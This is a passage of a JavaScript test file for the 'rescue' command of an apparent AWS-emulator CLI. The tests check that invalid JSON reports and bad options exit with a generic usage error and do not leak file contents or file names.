  } finally {rmSync(dir,{recursive:true,force:true});}
});

test('JSON-only invalid reports and invalid CLI options fail generically without leaking content',()=>{
  const dir=mkdtempSync(path.join(tmpdir(),'rescue-invalid-'));
  try {
    const filename=path.join(dir,'malicious.json');
    for(const raw of ['not-json SECRET_PRIVATE',JSON.stringify({schemaVersion:1,unknown:'SECRET_PRIVATE'})]){
      writeFileSync(filename,raw);
      const x=spawnSync(process.execPath,[BIN,'rescue',filename,'--json'],{encoding:'utf8',timeout:9000});
      assert.equal(x.status,2);
      assert.equal(x.stdout,'');
      assert.doesNotMatch(x.stderr,/SECRET_PRIVATE|malicious\.json/);
    }
    for(const args of [['rescue'],['rescue','--json'],['rescue','a.json','--offline'],['rescue','a.json','--json','--json']]){
      const x=spawnSync(process.execPath,[BIN,...args],{encoding:'utf8',timeout:9000});
      assert.equal(x.status,2);
      assert.equal(x.stdout,'');
      assert.match(x.stderr,/Usage: aws-emulator-mcp rescue/);
    }
  }finally{rmSync(dir,{recursive:true,force:true});}
});
